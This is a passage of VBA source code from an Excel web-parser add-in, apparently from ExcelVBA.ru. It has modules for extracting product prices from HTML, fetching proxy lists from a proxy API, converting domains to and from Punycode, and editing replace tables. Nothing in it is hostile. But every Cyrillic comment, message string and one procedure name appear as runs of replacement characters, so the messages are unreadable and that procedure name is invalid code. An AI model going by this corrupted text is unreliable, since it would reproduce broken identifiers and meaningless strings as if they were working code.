        txt$ = ApplyHTMLFilters(txt$, Filters$, msg$)        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(txt) < LenTXT& Then FilterApplied = True
    End If

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <meta itemprop="price" content="...">
    res$ = GetTags(txt, "meta", "itemprop", "price", "content 1")

    ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop="price">
    If res$ = "" Then res$ = GetTags(txt, "any tag", "itemprop", "price", "OuterHTML 1")

    Dim v, Content$, cnt&, i&, TagText, price As Double, arr

    ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| price
    If res$ = "" Then
        msg$ = msg$ & "|fffd||fffd||fffd| itemprop=""price"" |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.<br />"

        PriceClasses = Array("price", "productPrice", "*price*", "cost", "cena")

        For Each ClassName In PriceClasses
            res$ = GetTags(txt, "any tag", "class", ClassName, "outerHTML join")

            If res Like "*#*#*" Then
                res$ = Replace(res$, "bold", "")
                res$ = GetTags(res$, "any tag", "AttributesPattern", "*[^h]old*", "DeleteTags")
                If res Like "*#*#*" Then
                    ' Debug.Print "found", res$
                    arr = "": arr = Split(GetTags(res$, "any tag", "class", ClassName, "ConvertToText"), ARSEP)
                    msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ClassName & "|fffd| (" & UBound(arr) + 1 & " |fffd||fffd|.)<br />"

                    For Each TagText In arr
                        ' Debug.Print "tag text", TagText
                        price = SearchPriceInText(CStr(TagText), ExcludeChars$)
                        If price Then msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & price & "|fffd|<br />": Exit For
                    Next TagText
                    If price Then Exit For
                    msg$ = msg$ & "|fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ClassName & "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
                End If
            End If
        Next

        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If FilterApplied And (price = 0) Then
            price = SearchPriceInText(ConvertHTMLtoText(txt), ExcludeChars$)
            If price Then
                msg$ = msg$ & "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, - |fffd||fffd| <strong>|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML</strong>.<br />"
            Else
                msg$ = msg$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
            End If
        End If

    Else
        price = SearchPriceInText(ConvertHTMLtoText(res), ExcludeChars$)
        msg$ = msg$ & "|fffd||fffd||fffd| itemprop=""price"" |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & price & "|fffd|.<br />"
    End If

    GetPrice2 = price: Erase arr
ExitSearchPrice:
    If Len(msg$) Then If TEST_ACTIONS_MODE Then AddBalloon msg$, IIf(price > 0, bt_Information, bt_Warning)
End Function

Function SearchPriceInText(ByVal txt$, Optional ExcludeChars$) As Double
    On Error Resume Next: Dim i&
    txt$ = Trim(Application.Clean(txt$))
    txt$ = Replace(txt$, " ", ""): txt$ = Replace(txt$, Chr(160), "")
    For i = 1 To Len(ExcludeChars$)
        If Not (Mid(ExcludeChars$, i, 1) Like "#") Then txt$ = Replace(txt$, Mid(ExcludeChars$, i, 1), "")
    Next i

    For i = 1 To Len(txt$)
        If Mid(txt$, i, 1) Like "#" Then txt$ = Mid(txt$, i): Exit For
    Next i
    For i = 2 To Len(txt$)
        If Not (Mid(txt$, i, 1) Like "[0-9.,]") Then txt$ = Left(txt$, i - 1): Exit For
    Next i
    For i = 2 To Len(txt$)
        If Not (Mid(txt$, i, 1) Like "[0-9.,]") Then txt$ = Left(txt$, i - 1): Exit For
    Next i

    ' |fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 23 |fffd||fffd||fffd||fffd| 2018
    'If txt Like "*#.###*" Then txt = Replace(txt, ".", "")
    'If txt Like "*#,###*" Then txt = Replace(txt, ",", "")

    'Debug.Print "txt", txt
    If Val(Replace(txt$, ",", ".")) Then SearchPriceInText = Val(Replace(txt$, ",", "."))
End Function

Function GetPrice(ByVal txt$) As Double
    On Error Resume Next: Dim res$, PriceClasses As Variant, ClassName
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - URL, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If IsURL(txt) Then txt = LoadFromURL_HTML(txt)

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <meta itemprop="price" content="...">
    res$ = GetPropertyByItemprop(txt, "price", "meta", 1)

    ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop="price">
    If res$ = "" Then res$ = GetPropertyByItemprop(txt, "price", "*", 1)

    ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| price
    PriceClasses = Array("price", "productPrice", "cost", "cena")
    Dim v, TagName$, Content$, cnt&, i&
    If res$ = "" Then
        With REGEXP
            .IgnoreCase = True
            For Each ClassName In PriceClasses
                .Pattern = "<([A-Za-z0-9]+) [^<>]*class=""[^<>""]*" & ClassName & "[^<>""]*""[^<>]*>"
                If .test(txt) Then
                    For Each v In .Execute(txt)
                        TagName$ = v.submatches.item(0)
                        Content$ = Split(txt, v.value)(1)
                        ' Debug.Print tagname$, Left(Content$, 50)
                        If Len(Content$) * Len(TagName$) Then
                            cnt& = 1
                            For i = 1 To Len(Content$)
                                If Mid(Content$, i, Len(TagName$) + 1) = "<" & TagName$ Then cnt& = cnt& + 1
                                If Mid(Content$, i, Len(TagName$) + 3) = "</" & TagName$ & ">" Then cnt& = cnt& - 1
                                If cnt& = 0 Then res$ = Left(Content$, i - 1): Exit For
                            Next i
                            If res Like "*#*#*" Then
                                If res Like "*<*>*" Then res = HTML2TXT(res)

                                For i = 1 To Len(res)
                                    If Mid(res, i, 1) Like "#" Then res = Mid(res, i): Exit For
                                Next i
                                res = Replace(res, "&nbsp;", ""): res = Replace(res, " ", ""): res = Replace(res, Chr(160), "")
                                res = Trim(Application.Clean(res))
                                'Debug.Print "res=""" & res & """"
                                Exit For
                            End If
                        End If
                    Next
                End If
            Next
        End With
    End If

    If res Like "*<*>*" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
        res = HTML2TXT(res)
        res = Replace(res, "&nbsp;", ""): res = Replace(res, " ", ""): res = Replace(res, Chr(160), "")
    End If

    If res Like "#*" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        res = Replace(res, "&nbsp;", ""): res = Replace(res, " ", ""): res = Replace(res, Chr(160), "")
        GetPrice = Val(res)
    End If
End Function

Attribute VB_Name = "mod_Proxy"
'---------------------------------------------------------------------------------------
' Module        : modProxy                    Version:
' Author        : Igor Vakhnenko                   Date: 03.10.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module: Option Explicit

Function Proxy_Check_Presets_Array() As Variant
    On Error Resume Next
    Dim arr(1 To 1, 1 To 2) As String

    arr(1, 1) = "https://whoer.net/ru" & ARSEP & "class=your-ip" & ARSEP & "%ProxyIP%" & ARSEP & ""
    arr(1, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IP |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| whoer.net"

    Proxy_Check_Presets_Array = arr
End Function

Function Proxy_StatsClearInterval_Array() As Variant
    On Error Resume Next
    Dim arr(1 To 20, 1 To 2) As String

    arr(1, 1) = "1": arr(1, 2) = "1 |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(2, 1) = "5": arr(2, 2) = "5 |fffd||fffd||fffd||fffd||fffd|"
    arr(3, 1) = "10": arr(3, 2) = "10 |fffd||fffd||fffd||fffd||fffd|"
    arr(4, 1) = "20": arr(4, 2) = "20 |fffd||fffd||fffd||fffd||fffd|"
    arr(5, 1) = "30": arr(5, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(6, 1) = "60": arr(6, 2) = "1 |fffd||fffd||fffd|"
    arr(7, 1) = "120": arr(7, 2) = "2 |fffd||fffd||fffd||fffd|"
    arr(8, 1) = "240": arr(8, 2) = "4 |fffd||fffd||fffd||fffd|"
    arr(9, 1) = "480": arr(9, 2) = "8 |fffd||fffd||fffd||fffd||fffd|"
    arr(10, 1) = "720": arr(10, 2) = "12 |fffd||fffd||fffd||fffd||fffd|"
    arr(11, 1) = "1440": arr(11, 2) = "1 |fffd||fffd||fffd||fffd|"
    arr(12, 1) = "2880": arr(12, 2) = "2 |fffd||fffd||fffd||fffd|"
    arr(13, 1) = "5760": arr(13, 2) = "4 |fffd||fffd||fffd||fffd|"
    arr(14, 1) = "10000": arr(14, 2) = "1 |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(15, 1) = "20000": arr(15, 2) = "2 |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(16, 1) = "43000": arr(16, 2) = "1 |fffd||fffd||fffd||fffd||fffd|"
    arr(17, 1) = "87000": arr(17, 2) = "2 |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(18, 1) = "175000": arr(18, 2) = "4 |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(19, 1) = "260000": arr(19, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(20, 1) = "525000": arr(20, 2) = "1 |fffd||fffd||fffd|"

    Proxy_StatsClearInterval_Array = arr
End Function

Function Proxy_GetList_FromBestProxies(ByVal APIkey$, Optional ByVal Limit$, Optional ByVal ProxyType$, _
                                       Optional ByVal ReturnFormat$, Optional ByVal Country$, Optional ByVal Level$, Optional ByVal Speed$, Optional ByVal Extra$)
    On Error Resume Next
    Dim URL$, QueryString$
    If Trim(APIkey$) = "" Then APIkey$ = Trim(SETT.GetText("TextBox_ProxyAPIkey"))
    
    If Trim(APIkey$) = "" Then
        AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:</b>" & vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| best-proxies.ru", bt_Warning
        Exit Function
    End If

    Select Case ReturnFormat$
        Case "ip:port": URL$ = "http://api.best-proxies.ru/proxylist.txt"
        Case "xml": URL$ = "http://api.best-proxies.ru/proxylist.json"
        Case Else: Exit Function
    End Select

    QueryString$ = QueryString$ & "key=" & Trim(APIkey$) & "&"

    Country$ = Replace(Country$, " ", "")
    If InStr(1, Country$, "-") > 0 Then
        Country$ = Replace(Country$, "-", "")
        QueryString$ = QueryString$ & "cex=1&"
    End If

    If Len(Trim(Limit$)) Then QueryString$ = QueryString$ & "limit=" & Trim(Limit$) & "&"
    If Len(Trim(ProxyType$)) Then QueryString$ = QueryString$ & "type=" & Trim(ProxyType$) & "&"
    If Len(Trim(Country$)) Then QueryString$ = QueryString$ & "country=" & Trim(Country$) & "&"
    If Len(Trim(Level$)) Then QueryString$ = QueryString$ & "level=" & Split(Level$)(0) & "&"
    If Len(Trim(Speed$)) Then QueryString$ = QueryString$ & "speed=" & Split(Speed$)(0) & "&"
    If Len(Trim(Extra$)) Then QueryString$ = QueryString$ & Trim(Extra$)

    URL$ = URL$ & "?" & QueryString$

    Dim res$, objH As New WinHttpRequest, err_msg$
    With objH
        .Open "GET", URL$, True
        .SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        .Send: DoEvents
        If .WaitForResponse(5) Then
            res$ = .ResponseText
            If .Status <> 200 Then
                res = GetTags(res, "a", , , "DeleteTags")
                AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <a href='" & URL$ & "'>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|</a>:</b>" & vbNewLine & ConvertHTMLtoText(res), bt_Warning
                Exit Function
            End If
        Else
            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:</b>" & vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 5 |fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
            Exit Function
        End If
    End With
    Set objH = Nothing

    Select Case ReturnFormat$
        Case "ip:port"
            Proxy_GetList_FromBestProxies = Replace(res, vbNewLine, ARSEP)

        Case "xml"
            Dim JSON As New cJSONparser
            res$ = JSON.ToXML(res$)
            Set JSON = Nothing
            res$ = GetTags(res, "item1", , , "outerHTML")
            Proxy_GetList_FromBestProxies = Replace(res, "item1", "proxy")

    End Select

End Function




Attribute VB_Name = "mod_Punycode"
'****************************************
'* Converts Domainnames from Unicode to Punycode and vice versa             *
'* Programmed: Achim Neubauer           Last Change: 22.03.2004 18:39       *
'****************************************
' source: http://www.herber.de/forum/archiv/1192to1196/1192164_Punycode_Unicode.html
' Edited 25.01.2015 by EducatedFool         http://ExcelVBA.ru/

Option Explicit
Option Private Module

'Punycode constants
Private Const BASE As Long = 36, TMIN As Long = 1, TMAX As Long = 26, SKEW As Long = 38, DAMP As Long = 700
Private Const INITIAL_BIAS As Long = 72, INITIAL_N As Long = 128
'********************************************************************************

Function ConvertURLtoPunycode(ByVal URL$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Punycode
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| http://|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http://xn--80aebe3cdmfdkg.xn--d1abbgf6aiiy.xn--p1ai/%D1%81%D0%BE%D0%B2%D0%B5%D1%82%D1%8B
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URLencode

    On Error Resume Next
    Dim arr, Host$, i&, l$, t$, txt$
    arr = Split(URL$, "/")
    arr(2) = EncodeHost(arr(2))        ' Punycode
    txt$ = Join(arr, "/")

    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 256
                t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "+"
            Case Else: t = l
        End Select
        ConvertURLtoPunycode = ConvertURLtoPunycode & t
    Next
End Function

Private Sub |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_ConvertURLtoPunycode()
    Dim Host$, newURL$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Host$ = "http://|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd|"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: http://xn--80aebe3cdmfdkg.xn--d1abbgf6aiiy.xn--p1ai/%D1%81%D0%BE%D0%B2%D0%B5%D1%82%D1%8B
    newURL$ = ConvertURLtoPunycode(Host$)
    MsgBox newURL$
End Sub

Public Function EncodeHost(ByVal Name As String) As String
    If Len(Name) = 0 Then Exit Function
    Dim arrLevels() As String, t As Long

    arrLevels = Split(Name, ".")
    For t = 0 To UBound(arrLevels)
        arrLevels(t) = Replace(arrLevels(t), "?", "ss")
        arrLevels(t) = Encode(arrLevels(t))
    Next t
    EncodeHost = Join(arrLevels, ".")
End Function

Public Function DecodeHost(Name As String) As String
    If Len(Name) = 0 Then Exit Function
    Dim arrLevels() As String, t As Long
    arrLevels = Split(Name, ".")
    For t = 0 To UBound(arrLevels)
        If Left$(LCase$(arrLevels(t)), 4) = "xn--" Then
            arrLevels(t) = Decode(Mid$(arrLevels(t), 5))
        End If
    Next t
    DecodeHost = Join(arrLevels, ".")
End Function

Public Function ConvertURLtoUnicode(ByVal URL$) As String
    If Len(URL$) = 0 Then Exit Function
    Dim arr() As String, i&
    arr = Split(URL$, "/")
    For i = LBound(arr) To UBound(arr)
         arr(i) = DecodeHost(arr(i))
    Next i
    ConvertURLtoUnicode = Join(arr, "/")
End Function
'********************************************************************************

Private Function Encode(text As String) As String
    On Error GoTo Ende
    Dim n&, delta&, bias&, b&, output$, l&, c$, H&, q&, m&, k&, t&
    bias = INITIAL_BIAS: n = INITIAL_N
    For l = 1 To Len(text)
        c = Mid$(text, l, 1)
        If IsBasic(c, INITIAL_N) Then output = output & c: b = b + 1
    Next l
    If Len(output) < Len(text) Then
        If Len(output) > 0 Then output = output & "-"
        output = "xn--" & output
    End If

    H = b
    While H < Len(text)
        m = GetMinCodePoint(n, text)
        delta = delta + UInt(m - n) * (H + 1)
        n = m
        For l = 1 To Len(text)
            c = Mid$(text, l, 1)
            If IsBasic(c, n) Then
                delta = delta + 1
            ElseIf UInt(AscW(c)) = n Then
                q = delta
                For k = BASE To &H7FFFFFFF Step BASE
                    If k <= bias + TMIN Then
                        t = TMIN
                    ElseIf k >= bias + TMAX Then
                        t = TMAX
                    Else
                        t = k - bias
                    End If
                    If q < t Then Exit For
                    output = output & Chr(Digit2Codepoint(t + ((q - t) Mod (BASE - t))))
                    Let q = (q - t) \ (BASE - t)
                Next k
                output = output & Chr(Digit2Codepoint(q))
                bias = Adapt(delta, H + 1, (H = b))
                delta = 0: H = H + 1
            End If
        Next l
        delta = delta + 1: n = n + 1
    Wend

Ende:
    Encode = output
End Function

Private Function Decode(text As String) As String
    On Error GoTo Ende
    Dim n&, i&, bias&, output$, l&, pos&, c$, oldi&, w&, k&, digit As Byte, t&
    n = INITIAL_N: bias = INITIAL_BIAS
    pos = InStrRev(text, "-")
    If pos > 0 Then
        For l = 1 To pos - 1
            c = Mid$(text, l, 1)
            If IsBasic(c, INITIAL_N) Then output = output & c Else Exit Function
        Next l
    End If

    pos = pos + 1
    Do While (pos <= Len(text))
        oldi = i: w = 1
        For k = BASE To &H7FFFFFFF Step BASE
            If pos > Len(text) Then Exit For        'out of code points
            c = Mid$(text, pos, 1)
            pos = pos + 1
            digit = Codepoint2Digit(Asc(c))
            If digit = 255 Then Exit Function        'bad code point
            i = i + digit * w
            If k <= bias Then
                t = TMIN
            ElseIf k >= bias + TMAX Then
                t = TMAX
            Else
                t = k - bias
            End If
            If digit < t Then Exit For
            w = w * (BASE - t)
        Next k
        bias = Adapt(i - oldi, Len(output) + 1, (oldi = 0))
        n = n + i \ (Len(output) + 1)
        i = i Mod (Len(output) + 1)
        If IsBasic(ChrW(n), INITIAL_N) Then Exit Function        'shouldn't be a basic code point
        output = Left$(output, i) & ChrW(n) & Mid$(output, i + 1)
        i = i + 1
    Loop
Ende:
    Decode = output
End Function

Private Function GetMinCodePoint(ByVal n As Long, ByVal data As String) As Long
    Dim t&, a&, result&
    result = &H7FFFFFFF
    For t = 1 To Len(data)
        a = UInt(AscW(Mid$(data, t, 1)))
        If (a >= n) And (a < result) Then result = a
    Next t
    GetMinCodePoint = result
End Function

Private Function IsBasic(c As String, ByVal n As Long) As Boolean
    IsBasic = (UInt(AscW(c)) < n)
End Function

Private Function Adapt(ByVal delta As Long, ByVal numpoints As Long, ByVal firsttime As Boolean) As Long
    Dim k As Long
    If (firsttime) Then delta = delta \ DAMP Else delta = delta \ 2
    delta = delta + (delta \ numpoints)
    k = 0
    While (delta > ((BASE - TMIN) * TMAX) \ 2)
        delta = delta \ (BASE - TMIN)
        k = k + BASE
    Wend
    Adapt = k + (((BASE - TMIN + 1) * delta) \ (delta + SKEW))
End Function

Private Function Digit2Codepoint(ByVal d As Long) As Long
    If (d < 26) Then
        Digit2Codepoint = d + &H61        'a'
    ElseIf (d < 36) Then
        Digit2Codepoint = d - 26 + &H30        '0'
    Else
        Debug.Print "Error in Function Digit2Codepoint"
    End If
End Function

Private Function Codepoint2Digit(ByVal c As Long) As Long
    If (c - &H30 < 10) Then        '0'
        Codepoint2Digit = 26 + c - &H30        '0'
    ElseIf (c - &H41 < 26) Then        'a'
        Codepoint2Digit = c - &H41        'a'
    ElseIf (c - &H61 < 26) Then        'A'
        Codepoint2Digit = c - &H61        'A'
    Else
        Codepoint2Digit = 255
        Debug.Print "Error in Function Codepoint2Digit"
    End If
End Function

Private Function UInt(i As Integer) As Long
    If i < 0 Then UInt = 2 ^ 16 + i Else UInt = i
End Function


Attribute VB_Name = "mod_REPLACE_TABLES"
'---------------------------------------------------------------------------------------
' Module        : mod_REPLACE_TABLES                    Version:
' Author        : Igor Vakhnenko                   Date: 01.10.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

Public REPLACE_TABLE_COMBOBOX As Object, REPLACE_TABLE_USERFORM As Object
Public Const RT_EDITOR_URL$ = "https://ExcelVBA.ru/resources/Parser/rt_editor.xls"
Public Const RT_EDITOR_FILENAME$ = "rt_editor_v2.xls"

Sub Edit_ReplaceTables()
    All_RT.Edit
End Sub

Function All_RT() As ReplaceTables
    On Error Resume Next: Set All_RT = New ReplaceTables
End Function

Sub Add_ReplaceTable_FromUserform(ByRef UF As Object, ByRef combo As Object, Optional ByVal Start_RT_Name$)
    On Error Resume Next

    Dim RT As ReplaceTable: Set RT = All_RT.Add("", Start_RT_Name$)
    If RT Is Nothing Then Exit Sub
    RT.Edit

    Set REPLACE_TABLE_USERFORM = UF
    Set REPLACE_TABLE_COMBOBOX = combo
    Application.ScreenUpdating = True: DoEvents
    UserForm_MINIMIZE UF
    AppActivate Application.Name
End Sub

Sub Edit_ReplaceTable_FromUserform(ByRef UF As Object, ByRef combo As Object)
    On Error Resume Next
    Dim RT_name$: RT_name$ = combo.text
    All_RT.GetItemByName(RT_name$).Edit

    Set REPLACE_TABLE_USERFORM = UF
    Set REPLACE_TABLE_COMBOBOX = combo
    Application.ScreenUpdating = True: DoEvents
    UserForm_MINIMIZE UF
    AppActivate Application.Name
End Sub

Function RT_SaveAndClose_Parser(ByRef sh As Worksheet) As Boolean
    On Error Resume Next: Err.Clear: Dim RT_name$
    RT_name$ = sh.Shapes("TextBox_RTname").OLEFormat.Object.text
    If RT_name$ = "" Then MsgBox "RT_name$ =""""", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function

    Dim ra As Range: Set ra = sh.Range(sh.Range("Header").Offset(1), sh.Cells(sh.Rows.Count, sh.Range("Header").Column).End(xlUp)).Resize(, 2)
    If ra Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function

    With All_RT.GetItemByName(RT_name$)
